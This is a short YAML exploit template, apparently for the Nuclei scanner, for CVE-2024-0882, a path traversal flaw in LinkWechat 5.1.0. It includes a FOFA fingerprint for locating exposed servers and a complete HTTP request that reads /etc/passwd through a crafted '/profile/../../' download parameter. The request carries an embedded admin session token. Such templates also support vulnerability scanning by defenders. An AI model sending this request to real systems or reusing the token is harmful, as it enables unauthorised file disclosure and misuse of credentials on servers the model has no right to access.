id: linkwechat-scrm-arbitrary-file-read

info:
  name: LinkWechat Scrm 通用下载接口路径遍历漏洞
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: icon_hash="-1120452546"
    qwdigital LinkWechat 5.1.0 版本中存在路径遍历漏洞。该缺陷存在于通用下载接口 /linkwechat-api/common/download/resource 的资源处理逻辑中。攻击者可通过构造恶意路径参数（如 /profile/../../../../../etc/passwd）绕过路径校验机制，实现远程任意文件访问。此漏洞需在用户认证上下文中触发，需持有任意有效用户会话进行复现
  reference:
  - CVE-2024-0882
  tags: LinkWechat

http:
- raw:
  - |
    GET /linkwechat-api/common/download/resource?name=/profile/../../../../../etc/passwd HTTP/1.1
    Host: {{Hostname}}
    Connection: close
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: Admin-Token=eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyX3R5cGUiOiIwMyIsInVzZXJfaWQiOjE2OCwibG9naW5fdHlwZSI6IkxpbmtXZUNoYXRBUEkiLCJ1c2VyX25hbWUiOiJsdyIsInVzZXJfa2V5IjoiNGI4NmUzM2QtZmYyNC00YWNjLTkwMzEtMDhlZTQ3YWI3NmFkIiwiY29ycF9uYW1lIjoi5Luf5b6u56eR5oqAIiwiY29ycF9pZCI6Ind3NjIyZmM4NTJmNzljM2YxMyJ9.ZYXfC0WL_RTueRE4qQVEO4C_3lF97_iUcgDbBx_muI8ev2ZA5DO7DSNFzXIky77lDKhjRs0grtEhR78v-Hhc8A
